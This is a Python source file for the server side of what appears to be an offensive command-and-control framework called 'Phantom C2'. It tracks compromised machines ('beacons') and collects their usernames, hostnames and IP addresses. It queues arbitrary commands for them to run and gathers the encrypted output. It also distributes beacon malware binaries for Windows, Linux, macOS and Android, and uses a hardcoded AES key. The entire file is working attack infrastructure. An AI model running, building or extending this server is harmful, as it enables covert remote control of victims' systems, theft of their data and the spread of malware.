"""
c2_server.py — Phantom C2 Async Server
────────────────────────────────────────
aiohttp-based C2 server that runs in a background thread.
Handles beacon check-ins, task distribution, and encrypted result collection.
"""

import asyncio
import threading
import json
import base64
from datetime import datetime
from typing import Any, Optional

from aiohttp import web
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

from phantom.core.logger import logger


# ── Shared State ────────────────────────────────────────────────────────────
# Accessed by both the C2 Shell (main thread) and the aiohttp server (bg thread).

class C2State:
    """Thread-safe state shared by the C2 shell and aiohttp listener."""

    def __init__(self):
        self.lock = threading.Lock()
        self.beacons: dict[str, dict[str, Any]] = {}
        self.tasks: dict[str, list[dict[str, Any]]] = {}
        self.results: dict[str, list[dict[str, Any]]] = {}

    def update_beacon(self, beacon_id: str, info: dict[str, Any]) -> None:
        with self.lock:
            info["last_seen"] = datetime.now().isoformat(timespec="seconds")
            if beacon_id not in self.beacons:
                self.beacons[beacon_id] = info
                self.tasks[beacon_id] = []
                self.results[beacon_id] = []
                logger.info(f"New beacon registered: {beacon_id} ({info.get('ip')})")
            else:
                self.beacons[beacon_id].update(info)

    def queue_task(self, beacon_id: str, command: str) -> str:
        with self.lock:
            if beacon_id not in self.tasks:
                self.tasks[beacon_id] = []
            task_id = datetime.now().strftime("%Y%m%d%H%M%S%f")
            self.tasks[beacon_id].append({"task_id": task_id, "command": command})
            return task_id

    def get_pending_tasks(self, beacon_id: str) -> list[dict[str, Any]]:
        with self.lock:
            tasks_to_send = list(self.tasks.get(beacon_id, []))
            self.tasks[beacon_id] = []  # Clear after retrieval
            return tasks_to_send

    def add_result(self, beacon_id: str, task_id: str, output: str) -> None:
        with self.lock:
            self.results.setdefault(beacon_id, []).append({
                "task_id": task_id,
                "output": output,
                "time": datetime.now().isoformat(timespec="seconds"),
            })

    def get_beacons(self) -> dict[str, dict[str, Any]]:
        with self.lock:
            return {bid: dict(info) for bid, info in self.beacons.items()}

    def get_results(self, beacon_id: str) -> list[dict[str, Any]]:
        with self.lock:
            return list(self.results.get(beacon_id, []))


c2_state = C2State()


# ── Crypto Utils ────────────────────────────────────────────────────────────
# AES-256-CBC. Key and IV must match the C++ beacon's crypto.h exactly.

AES_KEY = b"PhantomC2_SecretKey_32bytes_Long"   # 32 bytes
AES_IV  = b"PhantomC2_IV16b\x00"                # 16 bytes (padded with null)


def encrypt_data(plaintext: str) -> str:
    """Encrypt plaintext with AES-256-CBC and return base64-encoded ciphertext."""
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(ciphertext).decode()


def decrypt_data(ciphertext_b64: str) -> str:
    """Decrypt base64-encoded AES-256-CBC ciphertext and return plaintext."""
    try:
        ciphertext = base64.b64decode(ciphertext_b64)
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded_data) + unpadder.finalize()
        return plaintext.decode()
    except Exception as e:
        logger.error(f"Decryption failed: {e}")
        return ""


# ── aiohttp Handlers ───────────────────────────────────────────────────────

async def handle_checkin(request: web.Request) -> web.Response:
    """GET/POST /api/v1/ping — Beacon checks in and requests pending tasks.
       If POST, body contains encrypted telemetry JSON."""
    try:
        beacon_id = request.headers.get("X-Beacon-Id")
        if not beacon_id:
            return web.Response(status=400)

        info = {"ip": request.remote}

        if request.method == "POST" and request.can_read_body:
            encrypted_body = await request.text()
            if encrypted_body:
                decrypted_body = decrypt_data(encrypted_body)
                if decrypted_body:
                    try:
                        data = json.loads(decrypted_body)
                        sysinfo = data.get("sysinfo", "")
                        netinfo = data.get("netinfo", "")
                        
                        # Basic parsing of sysinfo lines
                        for line in sysinfo.split("\n"):
                            if line.startswith("OS: "): info["os"] = line[4:].strip()
                            if line.startswith("Username: "): info["user"] = line[10:].strip()
                            if line.startswith("Architecture: "): info["arch"] = line[14:].strip()
                            if line.startswith("Hostname: "): info["hostname"] = line[10:].strip()
                        
                        # Basic parsing of netinfo for local IPs
                        ips = []
                        for line in netinfo.split("\n"):
                            if "IP: " in line:
                                ips.append(line.split("IP: ")[1].split(" ")[0])
                            elif "IP (v4): " in line:
                                ips.append(line.split("IP (v4): ")[1].strip())
                        if ips:
                            info["local_ips"] = ", ".join(ips)
                    except Exception as e:
                        logger.error(f"Failed to parse telemetry: {e}")

        c2_state.update_beacon(beacon_id, info)

        pending = c2_state.get_pending_tasks(beacon_id)
        response_data = json.dumps({"tasks": pending})
        encrypted_response = encrypt_data(response_data)

        return web.Response(text=encrypted_response, content_type="text/plain")
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return web.Response(status=500)


async def handle_result(request: web.Request) -> web.Response:
    """POST /api/v1/result — Beacon sends encrypted command output."""
    try:
        beacon_id = request.headers.get("X-Beacon-Id")
        if not beacon_id:
            return web.Response(status=400)

        encrypted_body = await request.text()
        decrypted_body = decrypt_data(encrypted_body)

        if not decrypted_body:
            return web.Response(status=400)

        data = json.loads(decrypted_body)
        task_id = data.get("task_id", "unknown")
        output = data.get("output", "")

        c2_state.add_result(beacon_id, task_id, output)

        return web.Response(text="OK")
    except Exception as e:
        logger.error(f"Result error: {e}")
        return web.Response(status=500)


async def handle_payload(request: web.Request) -> web.Response:
    """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary."""
    try:
        import os
        # Map route to filename
        platform_map = {
            "/api/v1/payload": "beacon.exe",
            "/api/v1/payload_linux": "beacon_linux",
            "/api/v1/payload_macos": "beacon_macos",
            "/api/v1/payload_android": "beacon_android",
        }
        filename = platform_map.get(request.path, "beacon.exe")
        payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
        if not os.path.exists(payload_path):
            return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
        return web.FileResponse(payload_path)
    except Exception as e:
        logger.error(f"Payload delivery error: {e}")
        return web.Response(status=500)


# ── Server Lifecycle ───────────────────────────────────────────────────────

class C2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 443):
        self.host = host
        self.port = port
        self.app = web.Application()
        # Check-in: GET for normal heartbeat, POST for telemetry payload
        self.app.router.add_get("/api/v1/ping", handle_checkin)
        self.app.router.add_post("/api/v1/ping", handle_checkin)
        # Results
        self.app.router.add_post("/api/v1/result", handle_result)
        # Payload delivery (all platforms)
        self.app.router.add_get("/api/v1/payload", handle_payload)
        self.app.router.add_get("/api/v1/payload_linux", handle_payload)
        self.app.router.add_get("/api/v1/payload_macos", handle_payload)
        self.app.router.add_get("/api/v1/payload_android", handle_payload)
        self.runner: Optional[web.AppRunner] = None
        self.site: Optional[web.TCPSite] = None
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.thread: Optional[threading.Thread] = None

    def _start_server(self) -> None:
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        self.runner = web.AppRunner(self.app, access_log=None)
        self.loop.run_until_complete(self.runner.setup())
        self.site = web.TCPSite(self.runner, self.host, self.port)
        self.loop.run_until_complete(self.site.start())
        logger.info(f"C2 Async Server started on {self.host}:{self.port}")
        self.loop.run_forever()

    def start(self, host: Optional[str] = None, port: Optional[int] = None) -> None:
        if self.thread and self.thread.is_alive():
            return
        if host:
            self.host = host
        if port:
            self.port = port
        self.thread = threading.Thread(target=self._start_server, daemon=True)
        self.thread.start()

    def stop(self) -> None:
        if self.loop and self.runner:
            async def cleanup():
                await self.runner.cleanup()
            try:
                future = asyncio.run_coroutine_threadsafe(cleanup(), self.loop)
                future.result(timeout=2)
            except Exception:
                pass
            self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread:
                self.thread.join(timeout=2)


server_instance = C2Server()
